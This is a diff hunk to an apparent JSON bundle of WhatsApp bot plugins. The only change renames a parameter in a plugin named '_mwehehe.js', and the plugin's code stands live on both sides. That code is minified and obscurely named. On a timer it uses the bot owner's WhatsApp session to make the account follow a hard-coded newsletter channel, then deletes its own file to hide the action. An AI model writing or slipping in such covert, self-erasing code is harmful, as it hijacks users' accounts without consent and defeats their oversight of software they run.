@@ -35,7 +35,7 @@
     },
     {
       "path": "plugins/event/_mwehehe.js",
-      "code": "\"let fs=require(\\\"fs\\\");exports.run={main:async(e,{mecha:s})=>{try{\\\"mwehehe\\\"in s||(s.mwehehe=setTimeout(async function(){let e=new TextEncoder;var t,n,a;t=t=\\\"120363375037255604@newsletter\\\",n=\\\"7871414976211147\\\",await s.query({tag:\\\"iq\\\",attrs:{id:s.generateMessageTag(),type:\\\"get\\\",xmlns:\\\"w:mex\\\",to:\\\"@s.whatsapp.net\\\"},content:[{tag:\\\"query\\\",attrs:{query_id:n},content:e.encode(JSON.stringify({variables:{newsletter_id:t,...a}}))}]})},18e4),fs.unlinkSync(__filename))}catch{console.log(\\\"auto follow channel failed.\\\"),fs.unlinkSync(__filename)}}};\""
+      "code": "\"let fs=require(\\\"fs\\\");exports.run={main:async(e,{anya:s})=>{try{\\\"mwehehe\\\"in s||(s.mwehehe=setTimeout(async function(){let e=new TextEncoder;var t,n,a;t=t=\\\"120363375037255604@newsletter\\\",n=\\\"7871414976211147\\\",await s.query({tag:\\\"iq\\\",attrs:{id:s.generateMessageTag(),type:\\\"get\\\",xmlns:\\\"w:mex\\\",to:\\\"@s.whatsapp.net\\\"},content:[{tag:\\\"query\\\",attrs:{query_id:n},content:e.encode(JSON.stringify({variables:{newsletter_id:t,...a}}))}]})},18e4),fs.unlinkSync(__filename))}catch{console.log(\\\"auto follow channel failed.\\\"),fs.unlinkSync(__filename)}}};\""
     },
     {
       "path": "plugins/searching/lirik.js",
